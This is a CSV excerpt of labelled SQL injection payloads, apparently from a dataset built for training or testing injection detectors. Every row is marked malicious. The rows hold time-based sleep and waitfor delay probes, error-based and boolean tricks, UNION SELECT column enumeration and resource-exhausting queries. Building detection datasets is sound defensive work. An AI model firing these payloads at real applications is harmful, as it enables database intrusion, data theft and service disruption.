row_index,payload_norm,label,sqli_type_hint
10170,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( 1491 = 1491",1,
10171,"1 ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 7182 = 7182",1,
10172,1 ) where 2930 = 2930,1,
10173,"1 ) ) as berd where 5803 = 5803 union all select null,null,null,null,null,null,null--",1,
10174,"make_set ( 8734 = 8734,sleep ( 5 ) )",1,
10175,1 ) as rqac where 3381 = 3381 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,1,
10176,"1' ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( 'sqni' like 'sqni",1,
10177,"1' ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( 'cwjd' = 'cwjd",1,
10178,"-4694' ) where 1501 = 1501 union all select 1501,1501,1501,1501,1501,1501#",1,
10179,"1"" where 7232 = 7232 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --",1,
10180,1 ) where 3381 = 3381 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,1,
10181,"1'+ ( select mumb where 4658 = 4658 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1,
10182,"1"" ) where 4426 = 4426 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",1,
10183,"1' where 7445 = 7445 union all select null,null,null,null,null,null--",1,
10184,"-4091"" ) ) ) union all select 6694,6694--",1,
10185,"1%"" ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ""%"" = """,1,
10186,1' ) ) ) or sleep ( 5 ) and ( ( ( 'wuwv' = 'wuwv,1,
10187,"-6405' union all select 8235,8235,8235,8235,8235#",1,
10188,"1' ) ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( 'tnfm' like 'tnfm",1,
10189,"1"" ) where 9062 = 9062",1,
10190,"1 ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 3343 = 3343",1,
10191,"-8454"" or 6872 = 6872",1,
10192,select sleep ( 5 ) and ( 'qcsv' = 'qcsv,1,
10193,"-8612' ) as toeu where 6357 = 6357 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",1,
10194,-8378%' ) union all select 5491#,1,
10195,"-5193 where 2175 = 2175 union all select 2175,2175,2175,2175,2175,2175,2175,2175,2175,2175#",1,
10196,"1"" ) as nraw where 7984 = 7984 and elt ( 3114 = 3114,sleep ( 5 ) ) #",1,
10197,"1%"" ) ) union all select null,null,null,null,null,null,null,null,null,null--",1,
10198,1 ) where 7050 = 7050,1,
10199,1'|| ( select 'cgup' from dual where 5383 = 5383 waitfor delay '0:0:5'--,1,
